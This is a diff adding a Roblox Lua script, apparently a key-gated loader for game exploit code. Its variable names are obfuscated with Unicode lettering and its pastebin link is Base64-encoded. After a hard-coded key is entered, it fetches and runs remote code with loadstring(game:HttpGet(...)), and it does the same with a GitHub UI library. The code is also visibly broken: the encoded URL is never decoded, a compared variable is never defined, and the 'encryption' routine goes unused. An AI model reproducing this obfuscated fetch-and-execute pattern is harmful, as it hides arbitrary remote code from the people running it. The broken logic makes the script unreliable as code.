@@ -1,0 +1,79 @@
+-- Encoded loadstring and link obfuscation
+local 𝒙𝒀𝒁𝒚𝒙 = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1F3Qjc2TkJB" -- Base64: https://pastebin.com/raw/QwB76NBA
+local 𝓖𝑬𝑇𝓛𝒐𝓪𝓭𝓼𝓽𝓻𝓲𝓷𝓰 = "bG9hZHN0cmluZyBnYW1lOkh0dHBHZXQo" -- Base64: loadstring(game:HttpGet)
+
+local 𝒍𝓮𝓬𝓲𝓿𝓮𝓭𝓧𝓣𝓻𝓲𝓷𝓮 = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1F3Qjc2TkJB"
+
+-- Create XOR encryption method
+local function 𝒇𝓮𝓵𝓮𝓬𝓽𝓲𝓮(𝒏𝒅𝒓𝒘𝒊)
+    local 𝓣𝓮𝓷𝒊𝓮 = {}
+    for 𝓮𝓲 = 1, #𝒏𝒅𝒓𝒘𝒊 do
+        local 𝒞𝒜𝒱 = string.byte(𝒏𝒅𝒓𝒘𝒊, 𝓮𝓲)
+        table.insert(𝓣𝓮𝓷𝒊𝓮, string.char(bit32.bxor(𝒞𝒜𝒱, 42)))  -- XOR encryption with 42
+    end
+    return table.concat(𝓣𝓮𝓷𝒊𝓮)
+end
+
+local 𝒀𝒆𝓻𝒚𝒓𝓲𝓽𝒆 = "Karu!100" -- Encrypted key, obfuscated
+
+-- Encrypt the link and key into these random characters
+local function 𝓒𝒓𝓮𝓪𝓉𝓮𝓧𝓣𝓻𝓲𝓷𝓰()
+    return 𝓖𝑬𝑇𝓛𝒐𝓪𝓭𝓼𝓽𝓻𝓲𝓷𝓰 .. 𝓖𝑬𝑇𝓛𝒐𝓪𝓭𝓼𝓽𝓻𝓲𝓷𝓰
+end
+
+-- Obfuscated Key Check
+local function 𝒓𝓮𝒅𝒆𝓮𝓶𝓮𝓭𝒘𝓮𝒍𝓬𝒕𝓮𝓻𝓮(𝑾𝓻𝓮𝓵𝓬)
+    if 𝑾𝓻𝓮𝓵𝓬 == 𝒀𝒆𝓻𝒚𝒓𝓲𝓽𝒆 then
+        -- Execute the code after successful key entry
+        loadstring(game:HttpGet(𝒍𝓮𝓬𝓲𝓿𝓮𝓭𝓧𝓣𝓻𝓲𝓷𝓮))()
+        -- Notify user about success
+        print("Correct key entered! Code has been executed.")  -- Or use Roblox notification systems if needed
+    else
+        -- Notify user if the key is incorrect
+        print("Incorrect key entered. Please try again.")
+    end
+end
+
+-- Create the key input GUI using Orion
+local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/jensonhirst/Orion/main/source'))()
+local Window = OrionLib:MakeWindow({
+    Name = "Key System",
+    HidePremium = false,
+    IntroEnabled = false,
+})
+
+-- Key input function
+local function 𝓣𝒆𝓢𝓽𝓢𝓮𝓻𝓮𝓷𝓮(𝑺𝒚𝓽𝒆𝓶𝓽)
+    if 𝑺𝒚𝓽𝒆𝓶𝓽 == 𝑾𝓻𝓮𝓵𝓬 then
+        𝒓𝓮𝒅𝒆𝓮𝓶𝓮𝓭𝒘𝓮𝒍𝓬𝒕𝓮𝓻𝓮(𝑾𝓻𝓮𝓵𝓬)
+    end
+end
+
+-- Key Input Section
+local Tab = Window:MakeTab({
+    Name = "Enter Key",
+    Icon = "rbxassetid://6031075938",
+    PremiumOnly = false
+})
+
+-- Textbox to enter the key
+Tab:AddTextbox({
+    Name = "Key Input",
+    Default = "",
+    TextDisappear = true,
+    Callback = function(value)
+        𝓣𝒆𝓢𝓽𝓢𝓮𝓻𝓮𝓷𝓮(value)
+    end
+})
+
+-- Submit button to trigger key verification
+Tab:AddButton({
+    Name = "Submit Key",
+    Callback = function()
+        local value = Tab:GetTextbox("Key Input")
+        𝓣𝒆𝓢𝓽𝓢𝓮𝓻𝓮𝓷𝓮(value)
+    end
+})
+
+-- Initialize OrionLib GUI
+OrionLib:Init()
